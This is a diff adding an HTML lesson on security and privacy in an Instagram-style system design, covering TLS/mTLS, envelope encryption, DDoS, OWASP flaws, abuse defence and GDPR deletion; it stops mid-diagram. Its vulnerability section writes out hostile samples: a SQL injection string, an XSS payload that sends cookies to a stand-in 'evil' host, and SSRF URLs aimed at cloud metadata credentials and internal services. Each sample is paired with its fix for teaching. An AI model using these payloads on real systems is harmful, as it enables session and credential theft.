@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security &amp; Privacy — Instagram System Design</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body data-page="concept" data-slug="security">
+<article class="lesson">
+
+<div class="tldr">
+  <div class="tldr-title">TL;DR</div>
+  <ul>
+    <li>Security protects the <strong>CIA triad</strong> — confidentiality, integrity, availability — against attackers ranging from spammers to nation states. Privacy is about using personal data only as users expect and the law allows.</li>
+    <li>Encrypt everything: <strong>TLS</strong> to clients, <strong>mTLS</strong> between services, <strong>AES-256</strong> at rest with keys in a <strong>KMS</strong> via <strong>envelope encryption</strong>; keep secrets in a secrets manager, never in code.</li>
+    <li>Defend in layers against <strong>DDoS</strong> (anycast/CDN absorption, WAF, rate limiting) and common web flaws — <strong>injection, XSS, CSRF, IDOR, SSRF</strong> — and parse untrusted media in sandboxes.</li>
+    <li>Apply <strong>least privilege</strong> and <strong>zero trust</strong>; fight bots and abuse with rate limits, ML, challenges and device signals; protect accounts with <strong>2FA</strong>, anomaly detection and <strong>session revocation</strong>.</li>
+    <li>Honour <strong>GDPR rights</strong> with a deletion pipeline that reaches <em>every</em> store; minimise data (strip <strong>EXIF</strong>), keep <strong>audit logs</strong>, use <strong>E2EE</strong> for DMs, and think like an attacker with <strong>STRIDE</strong>.</li>
+  </ul>
+</div>
+
+<h2>1. The problem: why is security so central for Instagram?</h2>
+<p>Instagram holds some of the most personal data people have: private photos and videos, direct messages, phone numbers and emails, who they follow, where they were when a photo was taken, and what they look at. It is also a huge target:</p>
+<ul>
+  <li><strong>Account takeover</strong>: criminals use leaked password lists from other sites ("credential stuffing") to hijack accounts, especially valuable short usernames and large creator accounts.</li>
+  <li><strong>Spam, fake accounts and bots</strong>: automated likes/follows for sale, scam DMs, phishing comments.</li>
+  <li><strong>Scraping</strong>: harvesting profiles and phone numbers at scale.</li>
+  <li><strong>DDoS</strong>: floods of traffic to knock the service offline.</li>
+  <li><strong>Application vulnerabilities</strong>: a single missing permission check can expose a private account's photos to anyone.</li>
+  <li><strong>Insiders and supply chain</strong>: a compromised employee laptop or third-party library.</li>
+</ul>
+<p>And regulators (GDPR in the EU, many others) impose obligations — with fines in the hundreds of millions of euros — on how personal data is collected, used, retained and deleted. Security cannot be one box in the architecture diagram; it is a property of <em>every</em> box: the <a href="clients.html">apps</a>, <a href="dns.html">DNS</a>, the <a href="load-balancer.html">load balancer</a>, the <a href="api-gateway.html">API Gateway</a> (TLS, authN/Z, <a href="rate-limiting.html">rate limiting</a>), each service, every data store, Kafka, and the analytics platform.</p>
+
+<div class="callout analogy">
+  <span class="callout-title">🧠 Analogy</span>
+  Think of a bank. There are guards at the entrance (DDoS protection, WAF), ID checks at the counter (authentication), different keys for different rooms (least privilege), staff badges checked at <em>every</em> internal door, not just the front door (zero trust), a vault whose combination is itself locked in another safe (envelope encryption), CCTV recording who opened which drawer (audit logs), and shredders for documents customers ask to destroy (deletion). No single measure is enough — the security comes from the <strong>layers</strong> ("defence in depth").
+</div>
+
+<h2>2. The CIA triad</h2>
+<div class="cards">
+  <div class="card"><h4>🔒 Confidentiality</h4><p>Only authorised people can read data. Breach examples: a private account's photos visible to strangers; DMs leaked; phone numbers scraped.</p></div>
+  <div class="card"><h4>✅ Integrity</h4><p>Data isn't altered without authorisation. Breach examples: an attacker posts from your account; like counts inflated by bots; a tampered image served from the CDN.</p></div>
+  <div class="card"><h4>🟢 Availability</h4><p>The service works when users need it. Breach examples: DDoS takes down the feed; ransomware encrypts databases.</p></div>
+</div>
+<p>Two more properties are often added: <strong>authenticity</strong> (you know who you're talking to — the app really is talking to Instagram, the login really is you) and <strong>non-repudiation</strong> (actions can be proven, e.g. via audit logs). Every control in this lesson protects one or more of these.</p>
+
+<h2>3. Encryption in transit</h2>
+
+<h3>3.1 TLS between apps and Instagram</h3>
+<p><strong>TLS</strong> (Transport Layer Security, the "S" in HTTPS) gives a connection three guarantees: <em>confidentiality</em> (encrypted), <em>integrity</em> (tampering is detected) and <em>server authentication</em> (the certificate proves the server is really <code>instagram.com</code>). See <a href="networking-basics.html">Networking Basics</a> for the handshake. In practice:</p>
+<ul>
+  <li><strong>TLS 1.3</strong> only (or 1.2 with strong ciphers); forward secrecy via ephemeral (EC)DHE key exchange, so a stolen server key can't decrypt previously recorded traffic.</li>
+  <li><strong>HSTS</strong> header tells browsers to always use HTTPS for the domain, preventing downgrade attacks.</li>
+  <li><strong>Certificate pinning</strong> in mobile apps: the app accepts only certificates chained to keys it expects, defeating attackers who trick a phone into trusting a rogue certificate authority. Requires careful key rotation planning.</li>
+  <li><strong>Edge termination</strong>: TLS terminates at the nearest edge PoP (fast handshakes, see <a href="cdn.html">CDN</a>), and traffic is <em>re-encrypted</em> from the edge to the data center — never plaintext across the internet or even the private backbone.</li>
+</ul>
+
+<h3>3.2 mTLS between services</h3>
+<p>Inside the data center, the old model was "the internal network is trusted". Modern systems assume an attacker may already be inside (a compromised host), so service-to-service calls also use TLS — and <strong>mutual TLS (mTLS)</strong>, where <em>both</em> sides present certificates. The Feed Service proves to the Ranking Service that it really is the Feed Service, and vice versa.</p>
+<div class="diagram">
+<svg viewBox="0 0 860 220" width="860" xmlns="http://www.w3.org/2000/svg" font-size="13">
+  <defs><marker id="ar-sec-1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#555"/></marker></defs>
+  <g font-weight="600">
+    <rect x="15" y="70" width="120" height="50" rx="8" fill="#e1f5fe" stroke="#0277bd"/><text x="75" y="91" text-anchor="middle">📱 App</text><text x="75" y="108" text-anchor="middle" font-weight="400" font-size="11">pins certificate</text>
+    <rect x="190" y="70" width="130" height="50" rx="8" fill="#fff3e0" stroke="#ef6c00"/><text x="255" y="91" text-anchor="middle">Edge PoP</text><text x="255" y="108" text-anchor="middle" font-weight="400" font-size="11">TLS 1.3 terminates</text>
+    <rect x="375" y="70" width="130" height="50" rx="8" fill="#fff3e0" stroke="#ef6c00"/><text x="440" y="91" text-anchor="middle">LB / Gateway</text><text x="440" y="108" text-anchor="middle" font-weight="400" font-size="11">re-encrypted</text>
+    <rect x="560" y="20" width="130" height="50" rx="8" fill="#e8f5e9" stroke="#2e7d32"/><text x="625" y="41" text-anchor="middle">Feed Service</text><text x="625" y="58" text-anchor="middle" font-weight="400" font-size="11">cert: svc/feed</text>
+    <rect x="560" y="130" width="130" height="50" rx="8" fill="#e8f5e9" stroke="#2e7d32"/><text x="625" y="151" text-anchor="middle">Ranking</text><text x="625" y="168" text-anchor="middle" font-weight="400" font-size="11">cert: svc/ranking</text>
+    <rect x="730" y="75" width="115" height="50" rx="8" fill="#fff8e1" stroke="#f9a825"/><text x="787" y="96" text-anchor="middle">Data stores</text><text x="787" y="113" text-anchor="middle" font-weight="400" font-size="11">TLS + AES at rest</text>
+  </g>
+  <g stroke="#555" stroke-width="1.5" fill="none" marker-end="url(#ar-sec-1)">
+    <path d="M135,95 L188,95"/><path d="M320,95 L373,95"/><path d="M505,85 L558,50"/>
+    <path d="M625,70 L625,128" stroke="#2e7d32" stroke-width="2.5"/><path d="M690,50 L728,90"/><path d="M690,155 L728,112"/>
+  </g>
+  <g font-size="11" fill="#555">
+    <text x="161" y="85" text-anchor="middle">TLS</text><text x="346" y="85" text-anchor="middle">TLS</text>
+    <text x="617" y="104" text-anchor="end" fill="#2e7d32" font-weight="600">mTLS: both</text><text x="617" y="118" text-anchor="end" fill="#2e7d32" font-weight="600">sides verified</text>
+  </g>
+  <text x="430" y="210" text-anchor="middle" font-size="12" fill="#333">Every hop encrypted; inside the data center, both caller and callee prove their identity.</text>
+</svg>
+<div class="caption">Encryption in transit end to end: TLS from the app to the edge, re-encryption to the data center, and mTLS between services and to data stores.</div>
+</div>
+<ul>
+  <li>Each service instance gets a short-lived certificate (hours to days) encoding its <strong>service identity</strong> (e.g. a SPIFFE ID like <code>spiffe://ig/feed</code>), issued automatically by an internal certificate authority. Short lifetimes make stolen certificates nearly useless and force automated rotation.</li>
+  <li>Identity enables <strong>authorisation policies</strong>: "only <code>svc/feed</code> and <code>svc/explore</code> may call <code>svc/ranking</code>"; "only <code>svc/auth</code> may read the password-hash table".</li>
+  <li>A <strong>service mesh</strong> (Envoy/Istio/Linkerd sidecars) can do mTLS transparently, so application code doesn't change.</li>
+</ul>
+
+<h2>4. Encryption at rest</h2>
+<p>Encryption at rest protects data on disks, backups and object storage if the media is stolen, improperly decommissioned, or accessed outside the application. The standard cipher is <strong>AES-256</strong> (Advanced Encryption Standard with a 256-bit key), usually in <strong>GCM</strong> mode, which also detects tampering.</p>
+<div class="table-wrap"><table>
+  <tr><th>Level</th><th>What's encrypted</th><th>Protects against</th><th>Doesn't protect against</th></tr>
+  <tr><td><b>Full-disk / volume</b></td><td>Entire disks (self-encrypting drives, LUKS, cloud EBS encryption)</td><td>Stolen or discarded drives</td><td>Anyone who can query the running database</td></tr>
+  <tr><td><b>Database / storage-level (TDE, S3 SSE)</b></td><td>Database files, objects</td><td>Access to raw files, backups, snapshots</td><td>A compromised app or DB user</td></tr>
+  <tr><td><b>Application / field-level</b></td><td>Specific fields encrypted by the app before storage (phone number, email, DM content)</td><td>DB admins, SQL injection dumps, leaked backups</td><td>A compromised app server holding the keys; makes querying harder</td></tr>
+</table></div>
+
+<h3>4.1 KMS and envelope encryption</h3>
+<p>Encryption only moves the problem to the <strong>key</strong>. Keys must never sit next to the data or in code. A <strong>Key Management Service (KMS)</strong> — AWS KMS, Google Cloud KMS, HashiCorp Vault, or an internal equivalent backed by <strong>HSMs</strong> (hardware security modules) — holds master keys that never leave it; services ask the KMS to encrypt/decrypt small things, with every use access-controlled and audit-logged.</p>
+<p>But you can't send petabytes of photos through a KMS. <strong>Envelope encryption</strong> solves this:</p>
+<ol class="steps">
+  <li>For each object (or shard, or user), generate a random <strong>data encryption key (DEK)</strong> locally.</li>
+  <li>Encrypt the data with the DEK (fast, local AES).</li>
+  <li>Ask the KMS to encrypt the DEK with a <strong>key encryption key (KEK)</strong> that never leaves the KMS. Store the <em>encrypted DEK</em> next to the data; discard the plaintext DEK.</li>
+  <li>To read: send the encrypted DEK to the KMS (which checks permissions and logs the request), get the plaintext DEK back, decrypt the data, cache the DEK briefly.</li>
+</ol>
+<pre class="ascii">
+   ┌──────────── stored in S3 / DB ────────────┐          ┌──────── KMS / HSM ────────┐
+   │  ciphertext = AES-GCM(DEK, photo bytes)   │          │  KEK (never leaves)       │
+   │  wrapped_DEK = Encrypt(KEK, DEK)          │ ◄──────► │  Decrypt(wrapped_DEK)     │
+   └───────────────────────────────────────────┘  unwrap  │  → DEK  (audit-logged)    │
+                                                            └───────────────────────────┘
+ Rotating the KEK = re-wrap the small DEKs, not re-encrypt petabytes of data.
+ Destroying a user's DEK = all their data becomes unreadable ("crypto-shredding").
+</pre>
+<pre><code>def store_encrypted(user_id, blob):
+    dek = os.urandom(32)                                  # 256-bit data key
+    nonce = os.urandom(12)
+    ciphertext = AESGCM(dek).encrypt(nonce, blob, associated_data=str(user_id).encode())
+    wrapped = kms.encrypt(key_id="ig/user-data-kek", plaintext=dek)   # tiny KMS call
+    db.put(user_id, {"ct": ciphertext, "nonce": nonce, "wrapped_dek": wrapped})
+    del dek                                               # never persisted in plaintext</code></pre>
+<p>Key rotation becomes cheap (re-wrap DEKs), blast radius is small (one leaked DEK exposes one object/user), and per-user DEKs enable <strong>crypto-shredding</strong> — deleting a user's key makes every copy of their encrypted data, including in backups, unreadable. That is a powerful tool for deletion (section 12).</p>
+
+<h2>5. Secrets management</h2>
+<p>A <strong>secret</strong> is any credential: database passwords, API keys for push providers (APNs/FCM — see <a href="notifications.html">Notifications</a>), signing keys for <a href="cdn.html">CDN URLs</a> and session tokens, TLS private keys. Leaked secrets in source code are one of the most common causes of breaches — public repositories are scanned by attackers within minutes of a push.</p>
+<ul>
+  <li><strong>Never in code, images or config files in Git.</strong> Use a secrets manager (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager, or Kubernetes secrets backed by a KMS).</li>
+  <li><strong>Inject at runtime</strong>: the service authenticates with its workload identity (its mTLS cert / cloud IAM role) and fetches only the secrets it's allowed to.</li>
+  <li><strong>Prefer short-lived, dynamic credentials</strong>: e.g. Vault issues a unique DB username/password valid for 1 hour per instance; leaked credentials expire on their own and are traceable to one instance.</li>
+  <li><strong>Rotate</strong> regularly and automatically; support two valid versions during rotation so nothing breaks.</li>
+  <li><strong>Scan</strong> commits and CI logs for secrets (gitleaks, GitHub secret scanning) and revoke immediately on detection — deleting the commit is not enough.</li>
+</ul>
+
+<h2>6. DDoS: types and mitigations</h2>
+<p>A <strong>Distributed Denial of Service (DDoS)</strong> attack uses many machines (often a botnet of hijacked IoT devices) to overwhelm a service so legitimate users can't reach it — an attack on <em>availability</em>.</p>
+<div class="table-wrap"><table>
+  <tr><th>Type</th><th>How it works</th><th>Example</th><th>Main mitigations</th></tr>
+  <tr><td><b>Volumetric</b> (L3/L4)</td><td>Saturate network links with sheer bandwidth.</td><td>UDP/DNS/memcached amplification floods of 1+ Tbps.</td><td>Anycast spreads traffic over hundreds of PoPs; huge edge capacity; upstream scrubbing; drop unused protocols (UDP) at the edge.</td></tr>
+  <tr><td><b>Protocol</b> (L3/L4)</td><td>Exhaust state in servers, firewalls, load balancers.</td><td>SYN floods (half-open connections), ACK floods, fragmented packets.</td><td>SYN cookies, stateless edge filtering, connection limits, kernel/hardware offload at the LB.</td></tr>
+  <tr><td><b>Application-layer</b> (L7)</td><td>Valid-looking HTTP requests that are expensive to serve.</td><td>Millions of search queries or uncached feed/profile requests from many IPs; login floods.</td><td>WAF rules, <a href="rate-limiting.html">rate limiting</a> per IP/account/device, bot detection and challenges, caching, load shedding of expensive endpoints.</td></tr>
+</table></div>
+<p>Defence is layered from the outside in:</p>
+<div class="flow">
+  <div class="fnode ext">Attack traffic<small>botnet</small></div><div class="farrow">→<small>anycast spreads</small></div>
+  <div class="fnode edge">Edge PoPs / CDN<small>absorb volume, SYN cookies</small></div><div class="farrow">→<small>filtered</small></div>
+  <div class="fnode edge">WAF + bot detection<small>block bad patterns</small></div><div class="farrow">→</div>
+  <div class="fnode edge">Gateway rate limits<small>per IP / user / device</small></div><div class="farrow">→</div>
+  <div class="fnode svc">Services<small>load shedding, caches</small></div>
+</div>
+<ul>
+  <li><strong>Absorb at the edge</strong>: a 2 Tbps attack aimed at one anycast IP is split among, say, 200 PoPs → ~10 Gbps each, which each PoP can drop. The origin data centers never see it. This is a major advantage of the <a href="cdn.html">CDN/edge</a> layer.</li>
+  <li><strong>WAF (Web Application Firewall)</strong>: inspects HTTP requests and blocks known attack signatures (SQL injection payloads, malformed headers) and suspicious patterns (bad user agents, impossible request rates, known-bad IP reputation).</li>
+  <li><strong>Rate limiting</strong> at the <a href="api-gateway.html">gateway</a>: token buckets per IP, per account and per device; tighter limits on expensive endpoints (search, login, signup).</li>
+  <li><strong>Make expensive things cheap</strong>: cache popular responses; require authentication for expensive endpoints; use <a href="resilience-patterns.html">load shedding</a> so overload degrades rather than collapses the service.</li>
+</ul>
+
+<h2>7. Common application vulnerabilities (OWASP-style)</h2>
+<p>The <strong>OWASP Top 10</strong> is a widely used list of the most critical web application security risks. Here are the ones most relevant to an Instagram-like system, with concrete examples and fixes.</p>
+
+<h3>7.1 Injection</h3>
+<p>Untrusted input is interpreted as code or a query. Classic SQL injection in a username lookup:</p>
+<pre><code># ❌ VULNERABLE: input becomes part of the SQL text
+q = f"SELECT * FROM users WHERE username = '{name}'"
+#   name = "x' OR '1'='1"  → returns every user
+
+# ✅ SAFE: parameterised query — input is always data, never SQL
+cur.execute("SELECT id, username FROM users WHERE username = %s", (name,))</code></pre>
+<p>The same applies to NoSQL queries, Elasticsearch query DSL built from strings (search), shell commands (<code>ffmpeg</code> invoked with a user-supplied filename in the <a href="media-processing.html">media pipeline</a>), and LDAP. Use parameterised APIs and argument arrays, never string concatenation.</p>
+
+<h3>7.2 Cross-site scripting (XSS)</h3>
+<p>An attacker stores script in content other users will view — e.g. a comment or bio of <code>&lt;img src=x onerror="fetch('//evil/?c='+document.cookie)"&gt;</code>. If instagram.com renders it as HTML, it runs in every viewer's browser with their session. Fixes: <strong>context-aware output encoding</strong> by default (React/Django templates escape automatically — avoid <code>dangerouslySetInnerHTML</code> / <code>|safe</code>), a strict <strong>Content-Security-Policy</strong> header that forbids inline scripts, and <code>HttpOnly</code> cookies so scripts can't read session tokens.</p>
+
+<h3>7.3 Cross-site request forgery (CSRF)</h3>
+<p>A malicious page makes the victim's browser send a request to instagram.com, which automatically includes their cookies — e.g. a hidden form that POSTs <code>/web/friendships/&lt;id&gt;/follow/</code>. Fixes: <strong>CSRF tokens</strong> (a random per-session token that must be included in the request body/header and that the attacker's page can't read), <strong><code>SameSite=Lax/Strict</code> cookies</strong>, and checking the <code>Origin</code> header. Mobile apps using bearer tokens in headers (not cookies) aren't vulnerable in the same way.</p>
+
+<h3>7.4 Insecure direct object reference (IDOR) / broken access control</h3>
+<p>The most common serious bug class in APIs: the server trusts an ID from the request without checking the caller may access it.</p>
+<pre><code># ❌ VULNERABLE: anyone who guesses/enumerates a media_id can see a private account's photo
+@get("/v1/media/{media_id}")
+def get_media(media_id, viewer):
+    return media_store.get(media_id)
+
+# ✅ SAFE: authorise every object access on the server
+def get_media(media_id, viewer):
+    m = media_store.get(media_id)
+    owner = users.get(m.owner_id)
+    if owner.is_private and not graph.is_approved_follower(viewer.id, owner.id) and viewer.id != owner.id:
+        raise NotFound()             # 404, not 403: don't confirm the object exists
+    if graph.is_blocked(owner.id, viewer.id):
+        raise NotFound()
+    return m</code></pre>
+<p>Instagram-style IDs are 64-bit and time-ordered (see <a href="id-generation.html">ID generation</a>), so they're guessable — <strong>IDs are not secrets</strong>; authorisation must be enforced on every read and write (also for DM threads, story viewers lists, archived posts). Centralise checks in a shared privacy/authorisation layer rather than re-implementing them in each endpoint; see <a href="authentication.html">Authentication &amp; Authorization</a>.</p>
+
+<h3>7.5 Server-side request forgery (SSRF) via image URLs</h3>
+<p>Some features make the <em>server</em> fetch a URL supplied by a user: "import profile picture from URL", link previews in DMs, fetching a thumbnail for a shared link. An attacker supplies an internal address instead:</p>
+<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/   ← cloud metadata: steals IAM keys
+http://10.0.3.17:6379/                                                ← internal Redis
+http://localhost:8080/admin                                           ← internal admin panel
+http://evil.example/redirect → 302 → http://169.254.169.254/...       ← bypass via redirect / DNS rebinding</code></pre>
+<p>Fixes: run URL fetching in an <strong>isolated egress proxy</strong> with no access to internal networks; resolve the hostname and <strong>block private, loopback, link-local and metadata IP ranges</strong> (re-check after every redirect, pin the resolved IP to defeat DNS rebinding); allow only <code>http/https</code> and expected ports; limit response size and time; and on clouds enforce IMDSv2 (metadata requires a session token).</p>
+
+<h3>7.6 Other high-impact risks</h3>
+<ul>
+  <li><strong>Broken authentication</strong>: weak session handling, missing brute-force protection (section 9).</li>
+  <li><strong>Security misconfiguration</strong>: public S3 buckets, debug endpoints in production, default credentials, verbose error pages leaking stack traces.</li>
+  <li><strong>Vulnerable dependencies</strong>: an old image library with a known exploit — use dependency scanning and fast patching.</li>
+  <li><strong>Excessive data exposure</strong>: an API returning a user's email and phone number in a JSON field the app simply doesn't display — scrapers will find it. Return only fields the caller is allowed to see.</li>
+</ul>
+
+<h2>8. Input validation and safe media parsing</h2>
+<p>Instagram's core feature is accepting files from strangers and processing them on its servers — one of the riskiest things a service can do. Image and video decoders are complex C/C++ code with a long history of memory-corruption vulnerabilities (e.g. "ImageTragick" in ImageMagick in 2016; a heap overflow in libwebp, CVE-2023-4863, exploited in the wild in 2023). A crafted JPEG can mean remote code execution on a media worker.</p>
+<ul>
+  <li><strong>Validate early</strong>: check size limits before upload completes (pre-signed URL conditions, see <a href="media-upload.html">Media Upload</a>); detect the type by <strong>magic bytes</strong>, not the file extension or <code>Content-Type</code>; allowlist formats (JPEG, PNG, HEIC, WebP, MP4…).</li>
+  <li><strong>Limit resources</strong>: cap pixel dimensions and frame counts to defeat <strong>decompression bombs</strong> (a 50 KB PNG that decodes to 50,000 × 50,000 pixels = 10 GB of RAM); CPU-time and memory limits per job.</li>
+  <li><strong>Sandbox the decoders</strong>: run <a href="media-processing.html">media processing workers</a> in isolated containers/VMs (seccomp, gVisor, Firecracker), with no network access except to fetch input and write output, and no credentials beyond that.</li>
+  <li><strong>Re-encode everything</strong>: never serve the user's original bytes; decode and re-encode to known-good renditions. This also strips hidden payloads and metadata (EXIF — section 12).</li>
+  <li><strong>Prefer memory-safe parsers</strong> where possible (Rust/Go implementations), keep libraries patched, and <strong>fuzz</strong> parsers continuously.</li>
+  <li><strong>Validate all other input</strong> server-side: lengths of captions and bios, Unicode normalisation (homoglyph usernames like "instаgram" with a Cyrillic "а"), allowed characters in usernames, numeric ranges. Client-side validation is for UX only — attackers call the API directly.</li>
+</ul>
+
+<h2>9. Least privilege and zero trust</h2>
+<p><strong>Least privilege</strong>: every person, service and process gets the minimum access needed, for the minimum time. <strong>Zero trust</strong>: no implicit trust based on network location — every request is authenticated, authorised and encrypted, whether it comes from the internet or from the next rack ("never trust, always verify"; Google's BeyondCorp is the well-known example).</p>
+<div class="table-wrap"><table>
+  <tr><th>Principle</th><th>In practice at Instagram-like scale</th></tr>
+  <tr><td>Per-service identity &amp; scoped permissions</td><td>The Search Indexer can read the post-created Kafka topic and write to Elasticsearch — nothing else. It cannot read DMs or the password table.</td></tr>
+  <tr><td>Database grants per service</td><td>Feed Service has read-only access to post metadata; only the User/Auth Service can read credential tables.</td></tr>
+  <tr><td>Employee access</td><td>No standing access to production user data; just-in-time access with a justification and approval, time-limited, fully audit-logged (section 13).</td></tr>
+  <tr><td>Device &amp; user verification</td><td>Engineers reach internal tools only from managed, healthy devices with hardware-key 2FA — no VPN-equals-trusted.</td></tr>
+  <tr><td>Segmentation</td><td>Media-processing sandboxes cannot open connections to databases; production can't be reached from developer laptops directly.</td></tr>
+  <tr><td>Blast-radius thinking</td><td>Assume any single component is compromised; what can the attacker reach from there? Reduce it.</td></tr>
+</table></div>
+
+<h2>10. Bot, spam and abuse defence</h2>
+<p>Much of Instagram's "security" work is fighting <strong>abuse</strong>: fake accounts, automated likes/follows, spam comments, scam DMs, scraping. Attackers use real phones, residential proxies and human click-farms, so no single signal works. Defence is layered and adaptive:</p>
+<ul>
+  <li><strong>Rate limits</strong> per account, device, IP, and action type (follows/hour, comments/minute, DMs to non-followers/day) — new accounts get tighter limits until they build reputation. See <a href="rate-limiting.html">Rate Limiting</a>.</li>
+  <li><strong>ML classifiers</strong> scoring accounts and actions from behavioural features: action velocity, account age, graph patterns (a cluster of new accounts all following the same targets), content similarity (the same comment posted 10,000 times), and reports. Real-time scoring uses stream processing (see <a href="analytics-ml.html">Analytics &amp; ML</a>).</li>
+  <li><strong>Challenges / friction</strong> when risk is elevated: CAPTCHA, phone or email verification, a "confirm it's you" step, temporarily blocked actions. Friction is applied in proportion to risk so normal users rarely see it.</li>
+  <li><strong>Device fingerprinting and attestation</strong>: signals that a request comes from a genuine, unmodified app on a real device (Google Play Integrity, Apple App Attest/DeviceCheck), plus device identifiers that link many accounts to one emulator farm.</li>
+  <li><strong>Reputation</strong> for IPs, ASNs (e.g. data-center ranges), email domains, phone-number ranges.</li>
+  <li><strong>Enforcement and feedback</strong>: removing fake followers and likes, disabling networks of accounts together, feeding confirmed abuse back into model training. Keep exact thresholds secret — attackers probe them.</li>
+</ul>
+
+<h2>11. Account security</h2>
+<ul>
+  <li><strong>Password storage</strong>: never store passwords; store a slow, salted hash (<strong>Argon2id</strong>, scrypt or bcrypt) so a leaked table is very expensive to crack. Check new passwords against known-breached lists.</li>
+  <li><strong>Two-factor authentication (2FA)</strong>: something you know + something you have. Authenticator-app TOTP codes or hardware keys/passkeys are much stronger than SMS (SIM-swap attacks). Passkeys (WebAuthn/FIDO2) are phishing-resistant because the credential is bound to the real domain.</li>
+  <li><strong>Login anomaly detection</strong>: score each login on new device, new country, impossible travel (London then Lagos 20 minutes later), known-bad IPs, many failed attempts across accounts (credential stuffing). Risky logins get a challenge or are blocked, and the user is notified ("New login from…").</li>
+  <li><strong>Session management</strong>: short-lived access tokens plus refresh tokens bound to the device; server-side session records so tokens can be <strong>revoked</strong>. The "Login activity → Log out" feature and "log out of all devices" after a password change must actually invalidate tokens everywhere — which requires a revocation check (a session table or revocation list consulted by the gateway/auth service, cached for seconds). See <a href="authentication.html">Authentication</a>.</li>
+  <li><strong>Account recovery</strong> is the weakest link: attackers target recovery flows (social engineering support, SIM swaps). Use multiple verified signals, delays for sensitive changes, and notify the old email/phone when they change.</li>
+</ul>
+
+<h2>12. Privacy: GDPR rights, deletion and data minimisation</h2>
+
+<h3>12.1 GDPR rights in system terms</h3>
+<p>The EU's <strong>General Data Protection Regulation (GDPR)</strong> gives people rights over their personal data, and each right becomes an engineering requirement:</p>
+<div class="table-wrap"><table>
+  <tr><th>Right</th><th>What the user can ask</th><th>System requirement</th></tr>
+  <tr><td>Access (Art. 15)</td><td>"What data do you have about me?"</td><td>Find all data for a user across every store and export it (Instagram's "Download your information").</td></tr>
+  <tr><td>Portability (Art. 20)</td><td>"Give me my data in a usable format."</td><td>Machine-readable export (JSON/HTML + media files).</td></tr>
+  <tr><td>Rectification (Art. 16)</td><td>"Fix incorrect data."</td><td>Edits propagate to derived copies (caches, search index).</td></tr>
+  <tr><td>Erasure (Art. 17)</td><td>"Delete my data."</td><td>A deletion pipeline that reaches <em>every</em> copy, within a bounded time.</td></tr>
+  <tr><td>Restriction / objection (Art. 18, 21)</td><td>"Stop using my data for X" (e.g. personalised ads).</td><td>Consent and purpose flags checked by pipelines and ranking.</td></tr>
+</table></div>
+<p>Underlying principles: <strong>lawful basis</strong> and <strong>purpose limitation</strong> (use data only for stated purposes), <strong>data minimisation</strong>, <strong>storage limitation</strong> (retention limits), security, and <strong>accountability</strong> (being able to prove compliance). Regulators enforce with large fines — e.g. Ireland's Data Protection Commission publicly fined Instagram €405 million in 2022 over the handling of children's data.</p>
+
+<h3>12.2 A deletion pipeline that reaches every store</h3>
+<p>Deleting an account is <em>not</em> <code>DELETE FROM users WHERE id = 42</code>. A user's data is spread across the whole architecture diagram: their row in the User DB, posts and comments in Cassandra, photos and every rendition in object storage, cached copies on the CDN, post IDs in millions of followers' Redis timelines, the search index, DMs, likes on others' posts, follow edges in the social graph, analytics tables, ML features and training sets, logs, and backups.</p>
+<div class="diagram">
+<svg viewBox="0 0 860 340" width="860" xmlns="http://www.w3.org/2000/svg" font-size="13">
+  <defs><marker id="ar-sec-2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#555"/></marker></defs>
+  <g font-weight="600">
+    <rect x="15" y="140" width="120" height="50" rx="8" fill="#e1f5fe" stroke="#0277bd"/><text x="75" y="161" text-anchor="middle">📱 Delete</text><text x="75" y="178" text-anchor="middle" font-weight="400" font-size="11">account request</text>
+    <rect x="165" y="130" width="140" height="70" rx="8" fill="#e8f5e9" stroke="#2e7d32"/><text x="235" y="155" text-anchor="middle">Deletion Service</text><text x="235" y="173" text-anchor="middle" font-weight="400" font-size="11">hide now; grace period</text><text x="235" y="188" text-anchor="middle" font-weight="400" font-size="11">deletion ledger</text>
+    <rect x="335" y="140" width="110" height="50" rx="8" fill="#f3e5f5" stroke="#6a1b9a"/><text x="390" y="161" text-anchor="middle">Kafka</text><text x="390" y="178" text-anchor="middle" font-weight="400" font-size="11">user_deleted</text>
+  </g>
+  <g font-size="12">
+    <rect x="482" y="10" width="196" height="30" rx="6" fill="#fff8e1" stroke="#f9a825"/><text x="580" y="30" text-anchor="middle">User DB (PostgreSQL)</text>
+    <rect x="482" y="48" width="196" height="30" rx="6" fill="#fff8e1" stroke="#f9a825"/><text x="580" y="68" text-anchor="middle">Posts/comments (Cassandra)</text>
+    <rect x="482" y="86" width="196" height="30" rx="6" fill="#fff8e1" stroke="#f9a825"/><text x="580" y="106" text-anchor="middle">Media in S3 + renditions</text>
+    <rect x="482" y="124" width="196" height="30" rx="6" fill="#fff3e0" stroke="#ef6c00"/><text x="580" y="144" text-anchor="middle">CDN purge</text>
+    <rect x="482" y="162" width="196" height="30" rx="6" fill="#fff8e1" stroke="#f9a825"/><text x="580" y="182" text-anchor="middle">Redis caches/timelines</text>
+    <rect x="482" y="200" width="196" height="30" rx="6" fill="#fff8e1" stroke="#f9a825"/><text x="580" y="220" text-anchor="middle">Search index (ES)</text>
+    <rect x="482" y="238" width="196" height="30" rx="6" fill="#fff8e1" stroke="#f9a825"/><text x="580" y="258" text-anchor="middle">Social graph, DMs</text>
+    <rect x="482" y="276" width="196" height="30" rx="6" fill="#f3e5f5" stroke="#6a1b9a"/><text x="580" y="296" text-anchor="middle">Analytics lake, ML data</text>
+    <rect x="698" y="124" width="150" height="50" rx="6" fill="#eceff1" stroke="#455a64"/><text x="773" y="145" text-anchor="middle">Backups</text><text x="773" y="162" text-anchor="middle" font-size="11">expire / crypto-shred</text>
+    <rect x="698" y="200" width="150" height="50" rx="6" fill="#eceff1" stroke="#455a64"/><text x="773" y="221" text-anchor="middle">Logs</text><text x="773" y="238" text-anchor="middle" font-size="11">short retention</text>
+    <rect x="165" y="270" width="280" height="50" rx="8" fill="#e8f5e9" stroke="#2e7d32"/><text x="305" y="291" text-anchor="middle" font-weight="600">Verifier / reconciliation</text><text x="305" y="308" text-anchor="middle" font-size="11">scans stores for leftovers, reports SLA</text>
+  </g>
